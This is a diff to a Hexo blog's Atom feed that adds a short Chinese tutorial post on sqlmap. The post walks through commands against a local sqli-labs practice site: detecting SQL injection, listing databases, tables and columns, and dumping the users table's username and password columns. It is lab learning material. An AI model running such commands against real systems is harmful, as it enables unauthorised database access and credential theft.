@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2021-10-25T13:37:00.960Z</updated>
+  <updated>2021-10-31T15:43:51.583Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,23 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>sqlmap</title>
+    <link href="http://example.com/2021/10/31/sqlmap/"/>
+    <id>http://example.com/2021/10/31/sqlmap/</id>
+    <published>2021-10-31T15:38:38.000Z</published>
+    <updated>2021-10-31T15:43:51.583Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://s3.bmp.ovh/imgs/2021/10/3694ac142e813ffd.jpg" alt="这是一张图片"></p><span id="more"></span><hr><h1>1.对url进行检测，判断是否存在SQL注入</h1>sqlmap.py -u “url” --batch // --batch 永远不要要求用户输入，使用默认行为 url必须叫""引起来 <br>sqlmap.py -u "http://127.0.0.1/sqli-labs-master/Less-1/?id=5" -batch <br><h1>2.获取数据库</h1> sqlmap.py -u url --dbs --batch    获取全部数据库 <br>sqlmap.py -u url --current-dbs --batch  获取当前数据库 <br>sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=5 --dbs --batch <br><h1>3 获取数据库中的表</h1>sqlmap.py -u url -D DB --tables --batch <br>sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=5 -D security --tables --batch <br><h1>4.获取表中的列</h1>sqlmap.py -u url -D DB -T TBL --columns --batch <br> sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=5 -D security -T users --columns --batch <br><h1>5.获取列中的数据</h1>sqlmap.py -u url -D DB -T TBL -C COL --dump --batch  // --dump 获取列中的内容 <br>sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=5 -D security -T users -C "username,password" --dump --batch ]]></content>
+    
+    
+    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://s3.bmp.ovh/imgs/2021/10/3694ac142e813ffd.jpg&quot; alt=&quot;这是一张图片&quot;&gt;&lt;/p&gt;</summary>
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>5-6</title>
